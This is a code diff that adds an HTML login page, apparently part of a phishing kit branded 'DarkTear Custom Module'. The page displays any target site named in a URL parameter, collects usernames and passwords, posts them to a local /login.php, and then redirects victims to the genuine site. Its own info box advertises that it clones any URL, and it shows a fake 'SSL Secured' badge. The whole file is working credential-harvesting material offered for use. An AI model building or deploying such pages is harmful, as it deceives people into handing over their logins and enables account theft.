@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Custom Login Page</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            padding: 50px 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            font-size: 36px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .logo p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .url-badge {
+            background: #f0f0f0;
+            border-radius: 30px;
+            padding: 12px 20px;
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .url-badge span {
+            font-weight: 600;
+            color: #667eea;
+            word-break: break-all;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card label {
+            color: #333;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+        
+        .card input {
+            height: 52px;
+            border: 2px solid #e5e5e5;
+            border-radius: 12px;
+            font-size: 16px;
+            padding: 0 16px;
+            margin-bottom: 20px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
+        }
+        
+        .card input::placeholder {
+            color: #999;
+        }
+        
+        .card button {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            height: 52px;
+            cursor: pointer;
+            margin: 8px 0 20px;
+            transition: transform 0.2s;
+        }
+        
+        .card button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
+        }
+        
+        .remember-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 10px 0 20px;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .remember-me input {
+            width: 18px;
+            height: 18px;
+            margin: 0;
+            accent-color: #667eea;
+        }
+        
+        .remember-me label {
+            color: #333;
+            font-size: 14px;
+            font-weight: 400;
+            cursor: pointer;
+        }
+        
+        .forgot-link {
+            color: #667eea;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .info-box {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.6;
+            border: 1px solid #e5e5e5;
+        }
+        
+        .info-box strong {
+            color: #333;
+            display: block;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .info-box ul {
+            list-style: none;
+        }
+        
+        .info-box li {
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+        }
+        
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer a:hover {
+            color: #667eea;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin: 20px 0 0;
+            font-size: 11px;
+            color: #999;
+            padding-top: 20px;
+            border-top: 1px solid #e5e5e5;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .remember-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>Custom Login</h1>
+            <p>Enter your credentials</p>
+        </div>
+        
+        <div class="url-badge">
+            🔗 You are logging into: <span id="targetUrl">example.com</span>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="" id="redirectField">
+                
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username" required autofocus>
+                
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                
+                <div class="remember-row">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Remember me</label>
+                    </div>
+                    <a href="#" class="forgot-link" onclick="alert('Password reset demo'); return false;">Forgot password?</a>
+                </div>
+                
+                <button type="submit">Sign In</button>
+            </form>
+            
+            <div class="info-box">
+                <strong>⚡ Custom Clone Mode</strong>
+                <ul>
+                    <li>🔗 This page will clone any target URL</li>
+                    <li>🔄 Redirects to original site after login</li>
+                    <li>📝 Configure target in server.py</li>
+                    <li>🎯 Use for any website not in the main list</li>
+                </ul>
+            </div>
+            
+            <div class="security-note">
+                <span>🔒</span>
+                <span>SSL Secured</span>
+                <span>•</span>
+                <span>DarkTear Custom Module</span>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
+            <a href="#" onclick="alert('Contact demo'); return false;">Contact</a>
+        </div>
+    </div>
+
+    <script>
+        // Get target URL from URL parameters (for customization)
+        const urlParams = new URLSearchParams(window.location.search);
+        const target = urlParams.get('target') || 'example.com';
+        
+        document.getElementById('targetUrl').textContent = target;
+        document.getElementById('redirectField').value = 'https://' + target;
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                e.preventDefault();
+                alert('Please enter your username and password');
+                return;
+            }
+        });
+        
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#667eea';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#e5e5e5';
+                }
+            });
+        });
+        
+        const rememberCheck = document.getElementById('remember');
+        rememberCheck.addEventListener('change', function() {
+            // Visual only
+        });
+        
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        window.addEventListener('load', function() {
+            document.getElementById('username').focus();
+        });
+    </script>
+</body>
+</html>
